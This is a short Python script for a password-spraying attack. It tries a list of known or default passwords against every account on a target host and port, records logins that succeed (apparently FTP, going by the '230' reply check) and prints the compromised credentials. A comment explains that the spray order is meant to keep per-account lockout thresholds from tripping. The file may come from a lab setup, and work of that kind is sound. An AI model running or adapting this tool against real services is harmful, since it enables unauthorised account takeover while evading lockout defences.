"""Known-password attack: a few known/default passwords sprayed across many accounts."""
import argparse
import os
import time

from attacker_dict import try_login


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--userlist", required=True)
    parser.add_argument("--passwords", required=True)
    parser.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attacker_spray.log"))
    args = parser.parse_args()

    os.makedirs(os.path.dirname(args.log), exist_ok=True)
    logf = open(args.log, "a")

    with open(args.userlist) as f:
        users = [line.strip() for line in f if line.strip()]
    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]

    hits = []
    start = time.time()
    # Spray order: one known password against every account before moving to
    # the next password, so a per-account failed-attempt threshold is less
    # likely to trip than a per-account dictionary sweep would.
    for password in passwords:
        for username in users:
            try:
                reply = try_login(args.host, args.port, username, password)
            except OSError as e:
                reply = f"ERROR {e}"
            elapsed = time.time() - start
            line = f"[{elapsed:7.3f}s] user={username} password={password!r} -> {reply}"
            print(line)
            logf.write(line + "\n")
            if reply.startswith("230"):
                hits.append((username, password))
                logf.write(f"CRACKED user={username} password={password}\n")

    print(f"\n{len(hits)} account(s) compromised:")
    for username, password in hits:
        print(f"  {username}:{password}")
    logf.close()


if __name__ == "__main__":
    main()
